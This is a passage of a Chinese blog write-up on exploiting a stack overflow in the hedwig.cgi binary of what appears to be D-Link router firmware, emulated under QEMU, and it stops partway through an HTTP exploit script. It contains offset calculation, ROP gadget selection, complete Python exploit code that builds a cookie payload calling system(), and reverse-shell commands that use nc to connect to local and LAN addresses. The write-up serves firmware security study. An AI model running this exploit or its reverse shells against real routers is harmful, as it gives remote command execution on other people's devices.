src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026185501362.png" alt="image-20211026185501362"></p><p>分析这部分前面的代码，可知随便传点参数即可</p><blockquote><p>查看别人的分析都说需要传入带uid的字段，不是很理解如何分析到的</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026185648146.png" alt="image-20211026185648146"></p><p>则根据上述分析可以修改我们的动调脚本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> test2.sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sudo ./test2.sh  <span class="string">&quot;x=x&quot;</span>  `python -c <span class="string">&quot;print &#x27;uid=&#x27; + open(&#x27;test&#x27;,&#x27;r&#x27;).read()&quot;</span>`</span></span><br><span class="line"></span><br><span class="line">INPUT=&quot;$1&quot;</span><br><span class="line">COOKIE=&quot;$2&quot;</span><br><span class="line">PORT=&quot;23946&quot;</span><br><span class="line">LEN=$(echo -n &quot;$INPUT&quot; | wc -c)</span><br><span class="line">cp $(which qemu-mipsel-static) ./qemu</span><br><span class="line"></span><br><span class="line">echo $INPUT | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=$COOKIE -E REQUEST_URI=&quot;/hedwig.cgi&quot; -E REMOTE_ADDR=&quot;127.0.0.1&quot;  -g $PORT /htdocs/web/hedwig.cgi</span><br><span class="line">rm -f ./qemu</span><br></pre></td></tr></table></figure><p>覆盖<code>$ra</code>后</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026190259828.png" alt="image-20211026190259828"></p><p>计算偏移量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  squashfs-root python3 patternLocOffset.py -s 0x68423668 -l 2000</span><br><span class="line">[*] Create pattern string contains 2000 characters ok!</span><br><span class="line">[*] No exact matches, looking for likely candidates...</span><br><span class="line">[+] Possible match at offset 1009 (adjusted another-endian)</span><br><span class="line">[+] take time: 0.0004 s</span><br></pre></td></tr></table></figure><p>得到偏移<code>1009</code></p><h3 id="ROP链的构造"><a href="#ROP链的构造" class="headerlink" title="ROP链的构造"></a>ROP链的构造</h3><p>首先要找到使用的libc.so</p><p>使用该命令利用脚本 <code>dbgscript</code> 方便每次我们用 <code>gdb-multiarch</code> 连接:<code>gdb-multiarch htdocs/cgibin -x dbgscript</code></p><p><strong>dbgscript 内容</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set arch mips</span><br><span class="line">set endian little</span><br><span class="line">target remote :23946</span><br></pre></td></tr></table></figure><p>但实际上，我们查看<code>lib</code>目录下的<code>libc.so.0</code>即可知</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026202802245.png" alt="image-20211026202802245"></p><p>接着获得system的地址， IDA打开， 搜索<code>system()</code>，可知<code>system()</code>在<code>libc</code>中偏移为<code>0x53200</code>, 加上基地址即可</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026204203964.png" alt="image-20211026204203964"></p><p>当然我们也可以通过pwntools进行获取</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./lib/libuClibc-0.9.30.1.so&quot;</span>)</span><br><span class="line">libc.address = <span class="number">0x7f738000</span> <span class="comment"># base address</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;system address: 0x%x&quot;</span> % system_addr)</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] system address: 0x7f78b200</span><br></pre></td></tr></table></figure><p>为了避开<code>0x00</code>，写入时<code>0x7f78b200- 1 = 0x767a8b1ff</code>，后面再找一个 gadget 加一即可</p><p>然后便是找一个能将<code>system()</code>首个参数写入<code>$a0</code>的 gadget，这里在<code>libuClibc-0.9.30.1.so</code>中使用<code>mipsrop</code>插件，利用<code>mipsrop.stackfinder()</code>命令找将栈上数据放入寄存器的 gadget：</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026210227919.png" alt="image-20211026210227919"></p><p>如上图，偏移<code>0x159cc</code>处，将<code>$sp+10</code>处的数据放入<code>$s5</code>后再放入<code>$a0</code>，然后跳到<code>$s5</code>中存的地址处</p><p>而根据下面这张图，<code>hedwigcgi_main()</code>结尾部分：</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026210355070.png" alt="image-20211026210355070"></p><p>我们可以得到栈上的布局应该为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">padding: 0x3CD</span><br><span class="line">$s0</span><br><span class="line">$s1</span><br><span class="line">$s2</span><br><span class="line">$s3</span><br><span class="line">$s4</span><br><span class="line">$s5</span><br><span class="line">$s6</span><br><span class="line">$s7</span><br><span class="line">$fp</span><br><span class="line">$ra &lt;== 返回地址</span><br><span class="line">offset: 0x10</span><br><span class="line">/bin/sh</span><br></pre></td></tr></table></figure><p>其中<code>$s0~$s7, $fp, $ra</code>我们都能控制</p><p>再找一个能把<code>system()</code>地址值加一（即对对应寄存器加一）的 gadget，命令<code>mipsrop.find(&quot;addiu .*,1&quot;)</code>，这里我们选用偏移<code>0x158D0</code>处的：</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026211325129.png" alt="image-20211026211325129"></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p><strong>如下</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> MIPSPayload <span class="keyword">import</span> MIPSPayload</span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">payload = MIPSPayload(<span class="number">0x7f738000</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./lib/libuClibc-0.9.30.1.so&quot;</span>)</span><br><span class="line">libc.address = <span class="number">0x7f738000</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;system address: 0x%x&quot;</span> % system_addr)</span><br><span class="line">calcsystem = <span class="number">0x158c8</span>    <span class="comment"># $s0 add 1, jalr $s5</span></span><br><span class="line">callsystem = <span class="number">0x159cc</span>    <span class="comment"># cmd -&gt; $a0, jalr $s0 (system_addr)</span></span><br><span class="line"></span><br><span class="line">payload.AddBuffer(<span class="number">0x3CD</span>)                    <span class="comment">#       973</span></span><br><span class="line">payload.AddAddress(system_addr - <span class="number">1</span>)         <span class="comment"># $s0   977</span></span><br><span class="line">payload.AddBuffer(<span class="number">4</span>)                        <span class="comment"># $s1   981</span></span><br><span class="line">payload.AddBuffer(<span class="number">4</span>)                        <span class="comment"># $s2   985</span></span><br><span class="line">payload.AddBuffer(<span class="number">4</span>)                        <span class="comment"># $s3   989</span></span><br><span class="line">payload.AddBuffer(<span class="number">4</span>)                        <span class="comment"># $s4   993                     </span></span><br><span class="line">payload.AddAddress(callsystem)              <span class="comment"># $s5   997</span></span><br><span class="line">payload.AddBuffer(<span class="number">4</span>)                        <span class="comment"># $s6   1001</span></span><br><span class="line">payload.AddBuffer(<span class="number">4</span>)                        <span class="comment"># $s7   1005</span></span><br><span class="line">payload.AddBuffer(<span class="number">4</span>)                        <span class="comment"># $fp   1009</span></span><br><span class="line">payload.AddAddress(calcsystem)              <span class="comment"># $ra</span></span><br><span class="line">payload.AddBuffer(<span class="number">0x10</span>)                     <span class="comment"># .text:000159CC  addiu   $s5, $sp, 0x170+var_160</span></span><br><span class="line">payload.Add(<span class="string">b&#x27;//bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;exploit&quot;</span>, <span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">f.write(payload.Build())</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>其中<code>MIPSPayload</code>为仿照书中写的</p><blockquote><p>其实也不知道写了有啥用, 很多pwntools已经集成了</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string, random, sys</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MIPSPayload</span>:</span></span><br><span class="line">    BADBYTES = <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">    LITTLE = <span class="string">&quot;little&quot;</span></span><br><span class="line">    BIG = <span class="string">&quot;big&quot;</span></span><br><span class="line">    FILLER = <span class="string">b&quot;A&quot;</span></span><br><span class="line">    BYTES = <span class="number">4</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, elfbase:<span class="built_in">int</span>, endian:<span class="built_in">str</span> = LITTLE, badbytes: <span class="built_in">bytes</span> = BADBYTES</span>):</span></span><br><span class="line">        self.elfbase = elfbase</span><br><span class="line">        self.badbytes = badbytes</span><br><span class="line">        self.endian = endian</span><br><span class="line">        self.payload = <span class="built_in">bytes</span>()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rand_text</span>(<span class="params">self, size</span>):</span></span><br><span class="line">        table = (string.ascii_letters + string.digits).encode()</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(random.choices(table, k=size))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(data) <span class="keyword">is</span> <span class="built_in">bytes</span>:</span><br><span class="line">            self.payload += data</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&quot;%s is no support type&quot;</span> % <span class="built_in">type</span>(data))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Address</span>(<span class="params">self, offset, base=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> base <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            base = self.elfbase</span><br><span class="line">        <span class="keyword">return</span> self.ToBytes(base + offset)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">AddAddress</span>(<span class="params">self, offset, base=<span class="literal">None</span></span>):</span></span><br><span class="line">        self.Add(self.Address(offset, base))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ToBytes</span>(<span class="params">self, value, size=BYTES</span>):</span></span><br><span class="line">        data = [(value &gt;&gt; (<span class="number">8</span> * i)) &amp; <span class="number">0xff</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size)]</span><br><span class="line">        <span class="keyword">if</span> self.endian != self.LITTLE:</span><br><span class="line">            data = data[::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">AddNOPs</span>(<span class="params">self, size</span>):</span></span><br><span class="line">        self.Add(self.rand_text(size))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">AddBuffer</span>(<span class="params">self, size, byte=FILLER</span>):</span></span><br><span class="line">        self.Add(byte * size)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Build</span>(<span class="params">self</span>):</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> self.payload:</span><br><span class="line">            <span class="keyword">if</span> self.badbytes.find(c) != -<span class="number">1</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;Bad byte found in payload at offset %d: 0x%.2X&quot;</span> % (count, c))</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> self.payload</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Print</span>(<span class="params">self, bpl = BYTES</span>):</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> self.payload:</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">4</span>:</span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line">                i = <span class="number">0</span></span><br><span class="line">            sys.stdout.write(<span class="string">&quot;\\x%.2X&quot;</span> % c)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            <span class="keyword">if</span> bpl &gt; <span class="number">0</span>:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>生成exp</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  squashfs-root python3 exp.py</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">[+] system address: 0x7f78b200</span><br></pre></td></tr></table></figure><h3 id="动调验证"><a href="#动调验证" class="headerlink" title="动调验证"></a>动调验证</h3><h4 id="QEMU-User-Mode"><a href="#QEMU-User-Mode" class="headerlink" title="QEMU-User-Mode"></a>QEMU-User-Mode</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ./test.sh &#x27;x=x&#x27; `python -c &quot;print &#x27;uid=&#x27; + open(&#x27;exploit&#x27;,&#x27;r&#x27;).read()&quot;`</span><br></pre></td></tr></table></figure><p>可知我们成功进入了 system 函数中</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026213334385.png" alt="image-20211026213334385"></p><p>但继续运行会导致crash且也没有获得shell</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026213720457.png" alt="image-20211026213720457"></p><p>分析system函数可知system以fork形式启动进程，并且当程序为子进程时跳转执行cmd：</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211026213740965.png" alt="image-20211026213740965"></p><p>尝试反弹shell命令<code>nc -e /bin/bash 127.0.0.1 1234</code></p><p>这里需要注意的是，如果还是用下面的命令的话，因为有空格会导致在传递参数时截断</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ./test.sh  &quot;x=1&quot;  `python -c &quot;print &#x27;uid=&#x27; + open(&#x27;exploit&#x27;,&#x27;r&#x27;).read()&quot;`</span><br></pre></td></tr></table></figure><p>直接修改sh脚本即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> test3.sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sudo ./test3.sh  <span class="string">&quot;x=x&quot;</span></span></span><br><span class="line"></span><br><span class="line">INPUT=&quot;$1&quot;</span><br><span class="line">COOKIE=$(python -c &quot;print &#x27;uid=&#x27; + open(&#x27;exploit&#x27;,&#x27;r&#x27;).read()&quot;)</span><br><span class="line">PORT=&quot;23946&quot;</span><br><span class="line">LEN=$(echo -n &quot;$INPUT&quot; | wc -c)</span><br><span class="line">cp $(which qemu-mipsel-static) ./qemu</span><br><span class="line">echo $INPUT | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=&quot;$COOKIE&quot; -E REQUEST_URI=&quot;/hedwig.cgi&quot; -E REMOTE_ADDR=&quot;127.0.0.1&quot; /htdocs/web/hedwig.cgi</span><br><span class="line">rm -f ./qemu</span><br></pre></td></tr></table></figure><p>也无法获得shell, 查看各种参考基本上说的是<code>qemu-user-mode</code>的问题 但也没说为啥</p><p>因为necat和ncat中nc版本的不同，有可能没有-e命令，试了下面的反弹方法也不行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkfifo /tmp/f &amp;&amp; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f</span><br></pre></td></tr></table></figure><ul><li>这里由于读入问题，不能用分号。所以直接将<code>rm /tmp/f</code>去掉，用<code>&amp;&amp;</code>代替<code>分号</code></li></ul><h4 id="QEMU-System-Mode"><a href="#QEMU-System-Mode" class="headerlink" title="QEMU-System-Mode"></a>QEMU-System-Mode</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-5kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap -nographic</span><br></pre></td></tr></table></figure><p>复制<code>squashfs-root</code>到虚拟机<code>sudo scp -r squashfs-root root@192.168.126.131:/root/ </code></p><p>在<code>squashfs-root</code>中放置配置文件conf</p><blockquote><p>留个坑，需要再来研究这个配置文件怎么写</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">LogGMT On  #开启log</span><br><span class="line">ErrorLog /log #log文件</span><br><span class="line"></span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">    NumConnections 15</span><br><span class="line">    BufSize 12288</span><br><span class="line">    InputBufSize 4096</span><br><span class="line">    ScriptBufSize 4096</span><br><span class="line">    NumHeaders 100</span><br><span class="line">    Timeout 60</span><br><span class="line">    ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">    Types</span><br><span class="line">    &#123;</span><br><span class="line">        text/html    &#123; html htm &#125;</span><br><span class="line">        text/xml    &#123; xml &#125;</span><br><span class="line">        text/plain    &#123; txt &#125;</span><br><span class="line">        image/gif    &#123; gif &#125;</span><br><span class="line">        image/jpeg    &#123; jpg &#125;</span><br><span class="line">        text/css    &#123; css &#125;</span><br><span class="line">        application/octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Specials</span><br><span class="line">    &#123;</span><br><span class="line">        Dump        &#123; /dump &#125;</span><br><span class="line">        CGI            &#123; cgi &#125;</span><br><span class="line">        Imagemap    &#123; map &#125;</span><br><span class="line">        Redirect    &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    External</span><br><span class="line">    &#123;</span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">    ServerName &quot;Linux, HTTP/1.1, &quot;</span><br><span class="line">    ServerId &quot;1234&quot;</span><br><span class="line">    Family inet</span><br><span class="line">    Interface eth0 #对应qemu虚拟机的网卡</span><br><span class="line">    Address 192.168.126.129 #对于qemu虚拟机IP</span><br><span class="line">    Port &quot;1234&quot; #对应未被使用的端口</span><br><span class="line">    Virtual</span><br><span class="line">    &#123;</span><br><span class="line">        AnyHost</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /</span><br><span class="line">            Location /htdocs/web</span><br><span class="line">            IndexNames &#123; index.php &#125;</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /HNAP1</span><br><span class="line">            Location /htdocs/HNAP1</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            IndexNames &#123; index.hnap &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在虚拟机的<code>squashfs-root</code>下执行如下指令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">cp conf /</span><br><span class="line">cp sbin/httpd /</span><br><span class="line">cp -rf htdocs/ /</span><br><span class="line">rm /etc/services</span><br><span class="line">cp -rf etc/ /</span><br><span class="line">cp lib/ld-uClibc-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libcrypt-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libc.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so.1  /lib/</span><br><span class="line">cp lib/ld-uClibc.so.0  /lib/</span><br><span class="line">cp lib/libcrypt.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so  /lib/</span><br><span class="line">cp lib/libuClibc-0.9.30.1.so  /lib/</span><br><span class="line"><span class="built_in">cd</span> /</span><br></pre></td></tr></table></figure><p>根据配置及固件，还需要在MIPS虚拟机中建立两个软连接：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line">ln -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class="line">ln -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class="line">/httpd -f /conf</span><br></pre></td></tr></table></figure><p>然后通过<code>curl http://192.168.126.129:1234/hedwig.cgi -v -X POST -H &quot;Content-Length: 8&quot; -b &quot;uid=zh&quot;</code>即可验证 web 服务是否正常启动</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211027192701402.png" alt="image-20211027192701402"></p><h5 id="确认偏移"><a href="#确认偏移" class="headerlink" title="确认偏移"></a>确认偏移</h5><p>动调脚本，这里需要提前将 MIPSEL 架构的 gdbserver 传到 qemu 虚拟机中，这里选择了别人编译好的<a href="https://github.com/rapid7/embedded-tools/blob/master/binaries/gdbserver/gdbserver.mipsle">gdbserver</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">export CONTENT_LENGTH=&quot;100&quot;</span><br><span class="line">export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">export HTTP_COOKIE=&quot;uid=`cat test`&quot;</span><br><span class="line">export REQUEST_METHOD=&quot;POST&quot;</span><br><span class="line">export REQUEST_URI=&quot;/hedwig.cgi&quot;</span><br><span class="line">echo &quot;uid=1234&quot;|./gdbserver.mipsel 192.168.126.129:6666 /htdocs/web/hedwig.cgi #IP为宿主机IP</span><br></pre></td></tr></table></figure><p>宿主机连接 gdbserver</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch htdocs/cgibin</span><br><span class="line">set architecture mips</span><br><span class="line">target remote 192.168.126.129:6666 #对应qemu地址和端口</span><br></pre></td></tr></table></figure><p>可以测试得偏移仍然是<code>1009</code></p><h5 id="确定-libc-基址"><a href="#确定-libc-基址" class="headerlink" title="确定 libc 基址"></a>确定 libc 基址</h5><p>在这之前我们先关掉地址随机化：<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p><blockquote><p>正常路由环境和MIPS虚拟机中为了程序运行速度会取消canary，地址随机化等保护机制</p></blockquote><p>接下来是确定 libc 的基地址，利用如下命令</p><ul><li>我这边的环境的话，概率成功需要多试几次</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/htdocs/web/hedwig.cgi &amp; cat /proc/PID/maps</span><br><span class="line"><span class="meta">#</span><span class="bash"> a &amp; b-&gt;先执行a再执行b，无论a是否成功</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@debian-mipsel:# /htdocs/web/hedwig.cgi&amp;cat /proc/1514/maps</span><br><span class="line">[1] 1514</span><br><span class="line">00400000-0041c000 r-xp 00000000 08:01 228956     /htdocs/cgibin</span><br><span class="line">0042c000-0042d000 rw-p 0001c000 08:01 228956     /htdocs/cgibin</span><br><span class="line">0042d000-0042f000 rwxp 00000000 00:00 0          [heap]</span><br><span class="line">2aaa8000-2aaad000 r-xp 00000000 08:01 547912     /lib/ld-uClibc-0.9.30.1.so</span><br><span class="line">2aaad000-2aaae000 rw-p 00000000 00:00 0 </span><br><span class="line">2aabc000-2aabd000 r--p 00004000 08:01 547912     /lib/ld-uClibc-0.9.30.1.so</span><br><span class="line">2aabd000-2aabe000 rw-p 00005000 08:01 547912     /lib/ld-uClibc-0.9.30.1.so</span><br><span class="line">2aabe000-2aae7000 r-xp 00000000 08:01 547913     /lib/libgcc_s.so.1</span><br><span class="line">2aae7000-2aaf7000 ---p 00000000 00:00 0 </span><br><span class="line">2aaf7000-2aaf8000 rw-p 00029000 08:01 547913     /lib/libgcc_s.so.1</span><br><span class="line">2aaf8000-2ab56000 r-xp 00000000 08:01 547915     /lib/libuClibc-0.9.30.1.so</span><br><span class="line">2ab56000-2ab65000 ---p 00000000 00:00 0 </span><br><span class="line">2ab65000-2ab66000 r--p 0005d000 08:01 547915     /lib/libuClibc-0.9.30.1.so</span><br><span class="line">2ab66000-2ab67000 rw-p 0005e000 08:01 547915     /lib/libuClibc-0.9.30.1.so</span><br><span class="line">2ab67000-2ab6c000 rw-p 00000000 00:00 0 </span><br><span class="line">7fd0a000-7fd1f000 rwxp 00000000 00:00 0          [stack]</span><br><span class="line">root@debian-mipsel:/proc# HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/xml</span><br><span class="line"></span><br><span class="line">&lt;hedwig&gt;&lt;result&gt;FAILED&lt;/result&gt;&lt;message&gt;no xml data.&lt;/message&gt;&lt;/hedwig&gt;</span><br></pre></td></tr></table></figure><p>可以看到<code>libc.so.0 -&gt; /lib/libuClibc-0.9.30.1.so</code>的加载基址为<code>0x2aaf8000</code></p><h5 id="EXP-HTTP发包"><a href="#EXP-HTTP发包" class="headerlink" title="EXP+HTTP发包"></a>EXP+HTTP发包</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload</span>(<span class="params">offset, libc_base, cmd</span>):</span></span><br><span class="line">    Calcsystem = <span class="number">0x158c8</span>    <span class="comment"># $s0 add 1, jalr $s5</span></span><br><span class="line">    Callsystem = <span class="number">0x159cc</span>    <span class="comment"># &#x27;/bin/sh&#x27; -&gt; $a0, jalr system</span></span><br><span class="line">    system_addr_1 = <span class="number">0x53200</span> - <span class="number">1</span></span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span> * offset  <span class="comment"># 973</span></span><br><span class="line">    payload += p32(libc_base + system_addr_1)  <span class="comment"># s0     977</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s1     981</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s2     985</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s3     989</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s4     993</span></span><br><span class="line">    payload += p32(libc_base + Callsystem)     <span class="comment"># s5     997</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s6     1001</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s7     1005</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># fp     1009</span></span><br><span class="line">    payload += p32(libc_base + Calcsystem)     <span class="comment"># ra</span></span><br><span class="line">    payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">    payload += cmd</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cmd = <span class="string">b&quot;nc -e /bin/bash 192.168.141.225 4444&quot;</span></span><br><span class="line">    cookie = <span class="string">b&#x27;uid=&#x27;</span> + get_payload(<span class="number">973</span>, <span class="number">0x2aaf8000</span>, cmd)</span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: cookie,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span>: <span 